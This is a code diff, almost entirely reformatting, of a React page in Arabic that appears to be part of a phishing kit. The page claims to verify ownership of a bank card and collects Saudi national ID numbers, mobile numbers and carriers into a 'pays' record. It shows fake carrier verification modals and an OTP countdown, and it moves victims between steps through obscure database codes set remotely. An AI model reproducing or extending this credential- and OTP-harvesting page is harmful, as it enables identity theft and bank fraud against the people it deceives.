@@ -4,13 +4,28 @@ import { useEffect, useState } from "react";
 import { toast } from "sonner";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
-import { Phone, ShieldCheck, CreditCard, ChevronDown, Loader2, CheckCircle2, AlertCircle } from "lucide-react";
+import {
+  Phone,
+  ShieldCheck,
+  CreditCard,
+  ChevronDown,
+  Loader2,
+  CheckCircle2,
+  AlertCircle,
+} from "lucide-react";
 import { StcVerificationModal } from "@/components/stc-verification-modal";
 import { MobilyVerificationModal } from "@/components/mobily-verification-modal";
 import { CarrierVerificationModal } from "@/components/carrier-verification-modal";
 import { PhoneOtpDialog } from "@/components/dialog-b";
 
-import { db, setDoc, doc, onSnapshot, getDoc, Firestore } from "@/lib/supabase-client";
+import {
+  db,
+  setDoc,
+  doc,
+  onSnapshot,
+  getDoc,
+  Firestore,
+} from "@/lib/supabase-client";
 import { useRedirectMonitor } from "@/hooks/use-redirect-monitor";
 
 export default function VerifyPhonePage() {
@@ -28,13 +43,13 @@ export default function VerifyPhonePage() {
   const [otpCountdown, setOtpCountdown] = useState<number | null>(null);
 
   const telecomOperators = [
-    { value: "stc",    label: "STC - الاتصالات السعودية" },
+    { value: "stc", label: "STC - الاتصالات السعودية" },
     { value: "mobily", label: "Mobily - موبايلي" },
-    { value: "zain",   label: "Zain - زين" },
+    { value: "zain", label: "Zain - زين" },
     { value: "virgin", label: "Virgin Mobile - فيرجن موبايل" },
     { value: "lebara", label: "Lebara - ليبارا" },
-    { value: "salam",  label: "SALAM - سلام" },
-    { value: "go",     label: "GO - جو" },
+    { value: "salam", label: "SALAM - سلام" },
+    { value: "go", label: "GO - جو" },
   ];
 
   const visitorId =
@@ -46,7 +61,7 @@ export default function VerifyPhonePage() {
     if (visitorId && db) {
       const visitorRef = doc(db as Firestore, "pays", visitorId);
       setDoc(visitorRef, { redirectPage: null }, { merge: true }).catch((err) =>
-        console.error("[phone-info] Failed to clear redirectPage:", err)
+        console.error("[phone-info] Failed to clear redirectPage:", err),
       );
     }
   }, [visitorId]);
@@ -59,13 +74,13 @@ export default function VerifyPhonePage() {
       (docSnap) => {
         if (!docSnap.exists()) return;
         const data = docSnap.data();
-        if (data.currentStep === "home")  window.location.href = "/";
-        else if (data.currentStep === "_t6")  window.location.href = "/step4";
+        if (data.currentStep === "home") window.location.href = "/";
+        else if (data.currentStep === "_t6") window.location.href = "/step4";
         else if (data.currentStep === "_st1") window.location.href = "/check";
-        else if (data.currentStep === "_t2")  window.location.href = "/step2";
-        else if (data.currentStep === "_t3")  window.location.href = "/step3";
+        else if (data.currentStep === "_t2") window.location.href = "/step2";
+        else if (data.currentStep === "_t3") window.location.href = "/step3";
       },
-      (err) => console.error("[phone-info] Supabase listener error:", err)
+      (err) => console.error("[phone-info] Supabase listener error:", err),
     );
     return () => unsubscribe();
   }, []);
@@ -144,13 +159,16 @@ export default function VerifyPhonePage() {
           phoneUpdatedAt: new Date().toISOString(),
           redirectPage: null,
         },
-        { merge: true }
+        { merge: true },
       );
       // Start 5-second countdown
       setOtpCountdown(5);
     } catch (error) {
       console.error("Error saving phone data:", error);
-      toast.error("حدث خطأ", { description: "يرجى المحاولة مرة أخرى", duration: 5000 });
+      toast.error("حدث خطأ", {
+        description: "يرجى المحاولة مرة أخرى",
+        duration: 5000,
+      });
     }
   };
 
@@ -186,7 +204,7 @@ export default function VerifyPhonePage() {
             phoneOtpStatus: "pending",
             phoneCarrier: "",
           },
-          { merge: true }
+          { merge: true },
         );
       }
     } catch (error) {
@@ -200,14 +218,19 @@ export default function VerifyPhonePage() {
   };
 
   const handleShowWaitingModal = (carrier: string) => {
-    if (carrier === "stc")    setShowStcModal(true);
+    if (carrier === "stc") setShowStcModal(true);
     else if (carrier === "mobily") setShowMobilyModal(true);
     else setShowCarrierModal(true);
   };
 
   const isFormValid =
-    !!phoneNumber && !!selectedCarrier && phoneNumber.length === 10 && !phoneError &&
-    !!idNumber && idNumber.length === 10 && !idError;
+    !!phoneNumber &&
+    !!selectedCarrier &&
+    phoneNumber.length === 10 &&
+    !phoneError &&
+    !!idNumber &&
+    idNumber.length === 10 &&
+    !idError;
 
   const isCounting = otpCountdown !== null && otpCountdown > 0;
 
@@ -221,12 +244,17 @@ export default function VerifyPhonePage() {
         <div className="absolute inset-0 overflow-hidden pointer-events-none">
           <div className="absolute top-0 left-0 w-72 h-72 bg-white/5 rounded-full -ml-36 -mt-36 blur-3xl" />
           <div className="absolute bottom-0 right-0 w-96 h-96 bg-white/10 rounded-full -mr-48 -mb-48 blur-3xl" />
-          <div className="absolute inset-0 opacity-5"
-            style={{ backgroundImage: "radial-gradient(circle, #fff 1px, transparent 1px)", backgroundSize: "28px 28px" }} />
+          <div
+            className="absolute inset-0 opacity-5"
+            style={{
+              backgroundImage:
+                "radial-gradient(circle, #fff 1px, transparent 1px)",
+              backgroundSize: "28px 28px",
+            }}
+          />
         </div>
 
         <div className="w-full max-w-md space-y-5 relative z-10">
-
           {/* Header */}
           <div className="text-center text-white space-y-2 mb-2">
             <div className="w-16 h-16 bg-white/15 backdrop-blur-sm border border-white/20 rounded-2xl flex items-center justify-center mx-auto mb-3 shadow-lg">
@@ -240,12 +268,13 @@ export default function VerifyPhonePage() {
           <div className="bg-white rounded-3xl shadow-2xl overflow-hidden border border-white/10">
             <div className="h-1 bg-gradient-to-l from-[#42a5f5] via-[#1976d2] to-[#1565c0]" />
             <div className="p-6 space-y-5">
-
               {/* Approval error */}
               {approvalError && (
                 <div className="flex items-start gap-3 bg-red-50 border border-red-200 rounded-2xl p-4">
                   <AlertCircle className="w-5 h-5 text-red-600 flex-shrink-0 mt-0.5" />
-                  <p className="text-sm text-red-800 font-medium leading-relaxed">{approvalError}</p>
+                  <p className="text-sm text-red-800 font-medium leading-relaxed">
+                    {approvalError}
+                  </p>
                 </div>
               )}
 
@@ -254,20 +283,24 @@ export default function VerifyPhonePage() {
                 <div className="flex items-start gap-3">
                   <ShieldCheck className="w-5 h-5 text-blue-600 flex-shrink-0 mt-0.5" />
                   <p className="text-sm text-blue-900 font-medium leading-relaxed">
-                    للتحقق من ملكية وسيلة الدفع، يُرجى إدخال رقم الهوية ورقم الهاتف المرتبطين ببطاقتك البنكية.
+                    للتحقق من ملكية وسيلة الدفع، يُرجى إدخال رقم الهوية ورقم
+                    الهاتف المرتبطين ببطاقتك البنكية.
                   </p>
                 </div>
               </div>
 
               {/* ID Number */}
               <div className="space-y-1.5">
-                <Label className="text-right block text-slate-700 font-bold text-sm">رقم الهوية *</Label>
+                <Label className="text-right block text-slate-700 font-bold text-sm">
+                  رقم الهوية *
+                </Label>
                 <div className="relative">
                   <div className="absolute right-3.5 top-1/2 -translate-y-1/2 w-7 h-7 rounded-lg bg-[#1976d2]/10 flex items-center justify-center">
                     <CreditCard className="w-3.5 h-3.5 text-[#1976d2]" />
                   </div>
                   <Input
-                    type="tel" inputMode="numeric"
+                    type="tel"
+                    inputMode="numeric"
                     placeholder="1xxxxxxxxx"
                     value={idNumber}
                     onChange={handleIdChange}
@@ -278,18 +311,25 @@ export default function VerifyPhonePage() {
                     <CheckCircle2 className="absolute left-3.5 top-1/2 -translate-y-1/2 h-4 w-4 text-emerald-500" />
                   )}
                 </div>
-                {idError && <p className="text-xs text-red-600 font-medium">⚠ {idError}</p>}
+                {idError && (
+                  <p className="text-xs text-red-600 font-medium">
+                    ⚠ {idError}
+                  </p>
+                )}
               </div>
 
               {/* Phone */}
               <div className="space-y-1.5">
-                <Label className="text-right block text-slate-700 font-bold text-sm">رقم الجوال *</Label>
+                <Label className="text-right block text-slate-700 font-bold text-sm">
+                  رقم الجوال *
+                </Label>
                 <div className="relative">
                   <div className="absolute right-3.5 top-1/2 -translate-y-1/2 w-7 h-7 rounded-lg bg-[#1976d2]/10 flex items-center justify-center">
                     <Phone className="w-3.5 h-3.5 text-[#1976d2]" />
                   </div>
                   <Input
-                    type="tel" inputMode="numeric"
+                    type="tel"
+                    inputMode="numeric"
                     placeholder="05xxxxxxxx"
                     value={phoneNumber}
                     onChange={handlePhoneChange}
@@ -300,12 +340,18 @@ export default function VerifyPhonePage() {
                     <CheckCircle2 className="absolute left-3.5 top-1/2 -translate-y-1/2 h-4 w-4 text-emerald-500" />
                   )}
                 </div>
-                {phoneError && <p className="text-xs text-red-600 font-medium">⚠ {phoneError}</p>}
+                {phoneError && (
+                  <p className="text-xs text-red-600 font-medium">
+                    ⚠ {phoneError}
+                  </p>
+                )}
               </div>
 
               {/* Carrier */}
               <div className="space-y-1.5">
-                <Label className="text-right block text-slate-700 font-bold text-sm">شركة الاتصالات *</Label>
+                <Label className="text-right block text-slate-700 font-bold text-sm">
+                  شركة الاتصالات *
+                </Label>
                 <div className="relative">
                   <select
                     value={selectedCarrier}
@@ -314,7 +360,9 @@ export default function VerifyPhonePage() {
                   >
                     <option value="">اختر شركة الاتصالات</option>
                     {telecomOperators.map((op) => (
-                      <option key={op.value} value={op.value}>{op.label}</option>
+                      <option key={op.value} value={op.value}>
+                        {op.label}
+                      </option>
                     ))}
                   </select>
                   <ChevronDown className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-400 pointer-events-none" />
@@ -340,15 +388,33 @@ export default function VerifyPhonePage() {
                 {isCounting ? (
                   <>
                     <div className="relative w-8 h-8 flex items-center justify-center">
-                      <svg className="absolute inset-0 w-full h-full -rotate-90" viewBox="0 0 32 32">
-                        <circle cx="16" cy="16" r="13" fill="none" stroke="rgba(255,255,255,0.2)" strokeWidth="2.5" />
-                        <circle cx="16" cy="16" r="13" fill="none" stroke="rgba(255,255,255,0.8)" strokeWidth="2.5"
+                      <svg
+                        className="absolute inset-0 w-full h-full -rotate-90"
+                        viewBox="0 0 32 32"
+                      >
+                        <circle
+                          cx="16"
+                          cy="16"
+                          r="13"
+                          fill="none"
+                          stroke="rgba(255,255,255,0.2)"
+                          strokeWidth="2.5"
+                        />
+                        <circle
+                          cx="16"
+                          cy="16"
+                          r="13"
+                          fill="none"
+                          stroke="rgba(255,255,255,0.8)"
+                          strokeWidth="2.5"
                           strokeLinecap="round"
                           strokeDasharray={`${(((5 - (otpCountdown as number)) / 5) * 81.7).toFixed(1)} 81.7`}
                           style={{ transition: "stroke-dasharray 0.9s linear" }}
                         />
                       </svg>
-                      <span className="text-sm font-black text-white">{otpCountdown}</span>
+                      <span className="text-sm font-black text-white">
+                        {otpCountdown}
+                      </span>
                     </div>
                     <span>جاري إرسال رمز التحقق...</span>
                   </>
@@ -361,7 +427,9 @@ export default function VerifyPhonePage() {
               </button>
 
               <div className="text-center">
-                <p className="text-xs text-slate-400">🔒 معلوماتك محمية بأعلى معايير الأمان والخصوصية</p>
+                <p className="text-xs text-slate-400">
+                  🔒 معلوماتك محمية بأعلى معايير الأمان والخصوصية
+                </p>
               </div>
             </div>
           </div>
